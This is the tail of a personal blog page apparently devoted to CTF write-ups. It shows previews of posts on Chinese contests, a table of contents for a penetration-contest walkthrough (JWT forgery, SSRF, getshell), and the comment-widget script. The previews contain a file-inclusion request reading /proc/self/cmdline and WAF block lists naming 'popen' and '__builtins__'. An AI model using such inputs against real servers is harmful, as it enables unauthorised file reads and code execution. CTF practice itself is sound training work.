title="2024第一场ciscn-ctfshow复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-16</div><div class="info-item-2">2024第一场ciscn-ctfshow复现</div></div><div class="info-2"><div class="info-item-1">2024ciscn第一场本章内容均在ctfshow复现 sanicpython污染 源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from sanic import Sanicfrom sanic.response import text, htmlfrom sanic_session import Sessionimport pydash# pydash==5.1.2class Pollute:    def __init__(self):        passapp = Sanic(__name__)app.static(&quot;/static/&quot;, &quot;./static/&quot;)Session(app)@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])async def index(request):...</div></div></div></a><a class="pagination-related" href="/2024/12/10/24%E5%9B%BD%E5%9F%8E%E6%9D%AF/" title="24国城杯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-10</div><div class="info-item-2">24国城杯</div></div><div class="info-2"><div class="info-item-1">2024国城杯1Easy Jellyjava欠着 2Ez_Gallery 账号admin；密码123456；直接爆也行，验证码可以重复用  存在文件包含，不知道flag在哪 info?file&#x3D;&#x2F;proc&#x2F;self&#x2F;cmdline发现题目app.py；然后去读取题目源码 源码的shell路由是个ssti攻击点 黑名单 12345678blacklist_patterns = [r&#x27;.*length.*&#x27;,r&#x27;.*count.*&#x27;,r&#x27;.*[0-9].*&#x27;,r&#x27;.*\..*&#x27;,r&#x27;.*soft.*&#x27;]if any(re.search(pattern, expression) for pattern in blacklist_patterns):return Response(&#x27;wafwafwaf&#x27;)try:result...</div></div></div></a><a class="pagination-related" href="/2024/12/26/24%E5%BC%BA%E7%BD%91%E6%9D%AF/" title="24强网杯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-26</div><div class="info-item-2">24强网杯</div></div><div class="info-2"><div class="info-item-1">24强网PyBlockly题目源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158from flask import Flask, request, jsonifyimport reimport unidecodeimport stringimport astimport sysimport...</div></div></div></a><a class="pagination-related" href="/2024/12/03/wucup/" title="2024WuCup-wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-03</div><div class="info-item-2">2024WuCup-wp</div></div><div class="info-2"><div class="info-item-1">wucup-DDLmisc太极   1234567891011tai ji sheng liang yiliang yi sheng si xiangsi xiang sheng ba guaba gua ding ji xiongji xiong sheng da yetieny   12341---太极亦是轮回lieig     123 2(1212 -4) 5   ----周而复始sieau      1232 2(12312)jieay        12321(12121)   元神WuCup{0e49b776-b732-4242-b91c-8c513a1f12ce}  WuCup{7c16e21c-31c2-439e-a814-bba2ca54101a} 把docx文件换成zip文件  模糊的这个东西，减淡加弱化 WuCup{6bb9d97d-7169-434b-a7cf-0ee0b6fdfa30}      ...</div></div></div></a><a class="pagination-related" href="/2024/12/17/%E7%AC%AC%E4%BA%8C%E5%B1%8ACN-fnst-CTF/" title="第二届CN-fnst::CTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-17</div><div class="info-item-2">第二届CN-fnst::CTF</div></div><div class="info-2"><div class="info-item-1">CN-fnst::CTFweb1ez_python盲猜是文件包含file题目是python，读取源码；看到shell路由有个ssti  再看看waf &#x2F;?file&#x3D;&#x2F;app&#x2F;waf.py 123456def waf_check(value):    dangerous_patterns = [&#x27;os&#x27;, &#x27;set&#x27;, &#x27;__builtins__&#x27;, &#x27;=&#x27;, &#x27;.&#x27;, &#x27;&#123;&#123;&#x27;, &#x27;&#125;&#125;&#x27;, &#x27;popen&#x27;, &#x27;+&#x27;, &#x27;__&#x27;]    for pattern in dangerous_patterns:        if pattern in value:            return False    return...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">DDL</div><div class="author-info-description">WELCOME MY GARBAGE DUMP</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/DDL08"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/DDL08" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2179219117@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">师傅加个联系方式，讨论交流学习，若有不足还请师父指出</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2025ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B"><span class="toc-number">1.</span> <span class="toc-text">2025ctfshow元旦渗透赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0"><span class="toc-number">1.1.</span> <span class="toc-text">第一章</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag1-%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="toc-number">1.1.1.</span> <span class="toc-text">flag1-压缩包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag2-%E5%9B%BE%E7%89%87-%E5%AF%86%E7%A0%81"><span class="toc-number">1.1.2.</span> <span class="toc-text">flag2-图片-密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#crypto%E7%8E%AF%E5%A2%83%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">crypto环境问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%82%E7%A7%81%E9%92%A5"><span class="toc-number">1.1.3.</span> <span class="toc-text">求私钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag3-wp%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E8%B4%A6%E6%88%B7"><span class="toc-number">1.1.4.</span> <span class="toc-text">flag3-wp漏洞+基础账户</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0"><span class="toc-number">1.2.</span> <span class="toc-text">第二章</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag4-jwt%E4%BC%AA%E9%80%A0-%E7%AC%AC%E4%BA%8C%E4%B8%AA%E8%B4%A6%E6%88%B7"><span class="toc-number">1.2.1.</span> <span class="toc-text">flag4-jwt伪造+第二个账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-root%E8%B4%A6%E6%88%B7-app-py-bak%EF%BC%88%E5%90%AB%E5%AF%86%E7%A0%81"><span class="toc-number">1.2.2.</span> <span class="toc-text">flag5-文件读取+root账户+app.py.bak（含密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag6-ssrf-secret-key"><span class="toc-number">1.2.3.</span> <span class="toc-text">flag6-ssrf+secret_key</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%AB%A0"><span class="toc-number">1.3.</span> <span class="toc-text">第三章</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag7-ssrf%E4%BC%A0%E7%A0%81-%E8%8E%B7%E5%8F%96shell"><span class="toc-number">1.3.1.</span> <span class="toc-text">flag7-ssrf传码,获取shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">法二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag8-%E7%9C%BC%E7%9C%8B"><span class="toc-number">1.3.2.</span> <span class="toc-text">flag8-眼看</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E7%AB%A0"><span class="toc-number">1.4.</span> <span class="toc-text">第四章</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag9-session%E4%BC%AA%E9%80%A0-ssrf-key"><span class="toc-number">1.4.1.</span> <span class="toc-text">flag9-session伪造-ssrf+key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag10-flask%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6getshell"><span class="toc-number">1.4.2.</span> <span class="toc-text">flag10-flask日志文件getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">操作</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%95%E4%B8%89"><span class="toc-number">1.4.2.2.1.</span> <span class="toc-text">法三</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%AB%A0"><span class="toc-number">1.5.</span> <span class="toc-text">第五章</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag11"><span class="toc-number">1.5.1.</span> <span class="toc-text">flag11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag13"><span class="toc-number">1.5.2.</span> <span class="toc-text">flag13</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/16/2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0-ctfshow/" title="2025元旦渗透赛复现-ctfshow">2025元旦渗透赛复现-ctfshow</a><time datetime="2025-01-16T08:51:44.000Z" title="Created 2025-01-16 16:51:44">2025-01-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/16/2024%E7%AC%AC%E4%B8%80%E5%9C%BAciscn-ctfshow%E5%A4%8D%E7%8E%B0/" title="2024第一场ciscn-ctfshow复现">2024第一场ciscn-ctfshow复现</a><time datetime="2025-01-16T08:46:00.000Z" title="Created 2025-01-16 16:46:00">2025-01-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/" title="红日靶场12457">红日靶场12457</a><time datetime="2024-12-26T13:22:52.000Z" title="Created 2024-12-26 21:22:52">2024-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/26/24%E5%BC%BA%E7%BD%91%E6%9D%AF/" title="24强网杯">24强网杯</a><time datetime="2024-12-26T13:20:17.000Z" title="Created 2024-12-26 21:20:17">2024-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/17/%E7%AC%AC%E4%BA%8C%E5%B1%8ACN-fnst-CTF/" title="第二届CN-fnst::CTF">第二届CN-fnst::CTF</a><time datetime="2024-12-17T07:30:42.000Z" title="Created 2024-12-17 15:30:42">2024-12-17</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By DDL</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = null
+
+  const initValine = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyValine = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const valineConfig = {
+      el: '#vcomment',
+      appId: 'HVeI0ARPlb1wmqNwceN5bAr0-gzGzoHsz',
+      appKey: 'budtvYOInoQ1hIEDD2X5VhXq',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      visitor: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
+    }
+
+    new Valine(valineConfig)
+  }
+
+  const loadValine = async (el, path) => {
+    if (typeof Valine === 'function') {
+      initValine(el, path)
+    } else {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
+      initValine(el, path)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Valine' === 'Valine'
+      ? window.shuoshuoComment = { loadComment: loadValine }
+      : window.loadOtherComment = loadValine
+    return
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
